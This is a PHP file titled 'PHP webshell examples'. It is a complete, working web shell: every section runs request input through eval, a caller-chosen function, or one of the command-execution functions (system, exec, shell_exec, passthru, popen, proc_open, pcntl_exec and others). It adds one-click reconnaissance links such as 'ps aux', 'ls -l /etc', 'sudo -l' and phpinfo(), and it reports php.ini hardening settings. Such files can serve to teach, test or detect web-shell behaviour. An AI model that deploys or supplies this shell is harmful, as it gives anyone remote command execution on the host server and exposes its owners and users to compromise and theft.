<?php
    function add_php_function_links($var) {
        echo '<p>Functions:';
        foreach (array('print(PHP_VERSION);', 'echo phpversion();', 'phpinfo();', 'var_dump(get_loaded_extensions());', 'var_dump($_SERVER);') as $php_code) {
            echo ' <code><a href="?' . $var . '=' . urlencode($php_code) . '">' . htmlentities($php_code) . '</a></code>';
        }
        echo "</p>\n";
    }
    function add_shell_cmd_links($var, $use_full_path=false) {
        echo '<p>Commands:';
        foreach (array('id', 'pwd', 'ps aux', 'ls -l /proc/self/fd', 'ls -l /etc', 'sudo -l') as $cmd) {
            if ($use_full_path) {
                if (strpos($cmd, ' ') !== false)
                    continue;
                $cmd = '/usr/bin/' . $cmd;
            }
            echo ' <code><a href="?' . $var . '=' . urlencode($cmd) . '">' . htmlentities($cmd) . '</a></code>';
        }
        echo "</p>\n";
    }
?>
<!doctype html>
<html>
    <head>
        <title>PHP webshell examples</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    </head>
    <body>
        <h1>PHP webshell examples</h1>
        <h2>Run PHP code with <code>eval</code></h2>
        <pre>&lt;?php eval($_REQUEST['eval']); ?&gt;</pre>
<?php
    add_php_function_links('php_eval');
    if (!empty($_REQUEST['php_eval'])) {
        echo "<pre>";
        eval($_REQUEST['php_eval']);
        echo "\n</pre>";
    }
?>
        <h2>Run PHP functions with a function name and a value</h2>
        <pre>&lt;?php $_REQUEST['fname']($_REQUEST['fval']); ?&gt;</pre>
        <p>Functions:
            <code><a href="?fname=system&fval=id">system(id)</a></code>
            <code><a href="?fname=show_source&fval=<?php echo urlencode($_SERVER['SCRIPT_FILENAME']); ?>">show_source(<?php echo $_SERVER['SCRIPT_FILENAME']; ?>)</a></code>
        </p>
<?php
    if (!empty($_REQUEST['fname']) && isset($_REQUEST['fval'])) {
        echo "<pre>";
        $_REQUEST['fname']($_REQUEST['fval']);
        echo "\n</pre>";
    }
?>
        <h2>Run shell commands with <code>system</code></h2>
        <pre>&lt;?php system($_REQUEST['system']); ?&gt;</pre>
<?php
    add_shell_cmd_links('system');
    if (!empty($_REQUEST['system'])) {
        echo "<pre><xmp>";
        system($_REQUEST['system']);
        echo "\n</xmp></pre>";
    }
?>
        <h2>Run shell commands with <code>exec</code></h2>
        <pre>&lt;?php print(exec($_REQUEST['exec'])); ?&gt;</pre>
<?php
    add_shell_cmd_links('exec');
    if (!empty($_REQUEST['exec'])) {
        echo "<pre><xmp>";
        print(exec($_REQUEST['exec']));
        echo "\n</xmp></pre>";
    }
?>
        <h2>Run shell commands with <code>shell_exec</code></h2>
        <pre>&lt;?php print(shell_exec($_REQUEST['shell_exec'])); ?&gt;</pre>
<?php
    add_shell_cmd_links('shell_exec');
    if (!empty($_REQUEST['shell_exec'])) {
        echo "<pre><xmp>";
        print(shell_exec($_REQUEST['shell_exec']));
        echo "\n</xmp></pre>";
    }
?>
        <h2>Run shell commands with <code>pcntl_exec</code></h2>
        <pre>&lt;?php if (pcntl_fork() == 0)pcntl_exec($_REQUEST['pcntl_exec']); ?&gt;</pre>
<?php
    add_shell_cmd_links('pcntl_exec', true);
    if (!empty($_REQUEST['pcntl_exec'])) {
        echo "<pre>(Output in server's TTY)<xmp>";
        if (pcntl_fork() == 0)pcntl_exec($_REQUEST['pcntl_exec']);
        echo "\n</xmp></pre>";
    }
?>
        <h2>Run shell commands with <code>passthru</code></h2>
        <pre>&lt;?php passthru($_REQUEST['passthru']); ?&gt;</pre>
<?php
    add_shell_cmd_links('passthru');
    if (!empty($_REQUEST['passthru'])) {
        echo "<pre><xmp>";
        passthru($_REQUEST['passthru']);
        echo "\n</xmp></pre>";
    }
?>
        <h2>Run shell commands with <code>popen</code></h2>
        <pre>&lt;?php fpassthru(popen($_REQUEST['popen'], 'r')); ?&gt;</pre>
<?php
    add_shell_cmd_links('popen');
    if (!empty($_REQUEST['popen'])) {
        echo "<pre><xmp>";
        fpassthru(popen($_REQUEST['popen'], 'r'));
        echo "\n</xmp></pre>";
    }
?>
        <h2>Run shell commands with <code>expect_popen</code></h2>
        <pre>&lt;?php fpassthru(expect_popen($_REQUEST['expect_popen'])); ?&gt;</pre>
<?php
    if (function_exists('expect_popen')) {
        add_shell_cmd_links('expect_popen');
        if (!empty($_REQUEST['expect_popen'])) {
            echo "<pre><xmp>";
            fpassthru(expect_popen($_REQUEST['expect_popen']));
            echo "\n</xmp></pre>";
        }
    } else {
        echo '<p><code>expect_popen()</code> requires PECL expect >= 0.1.0</code></p>' . "\n";
    }
?>
        <h2>Run shell commands with <code>proc_open</code></h2>
        <pre>&lt;?php $p = array();$pr = proc_open($_REQUEST['proc_open'], array(1 => array('pipe', 'w')), $p);fpassthru($p[1]);proc_close($pr); ?&gt;</pre>
<?php
    add_shell_cmd_links('proc_open');
    if (!empty($_REQUEST['proc_open'])) {
        echo "<pre><xmp>";
        $p = array();$pr = proc_open($_REQUEST['proc_open'], array(1 => array('pipe', 'w')), $p);fpassthru($p[1]);proc_close($pr);
        echo "\n</xmp></pre>";
    }
?>
        <h2>php.ini configuration</h2>
        <ul>
<?php
    $config_values = array(
        'disable_functions' => null,
        'safe_mode' => true,
        'register_globals' => false,
        'allow_url_fopen' => '',
        'allow_url_include' => '',
        'enable_dl' => '',
        'extension_dir' => null,
    );
    foreach($config_values as $k => $secure_v)
    {
        $v = ini_get($k);
        echo '<li>' . $k . ' = ' . htmlentities(var_export($v, true));
        if (!is_null($secure_v)) {
            if ($secure_v == $v) {
                echo ' (OK)';
            } else {
                echo ' (expected ' . var_export($secure_v, true) . ')';
            }
        }
        echo "</li>\n";
    }
?>
        </ul>
    </body>
</html>
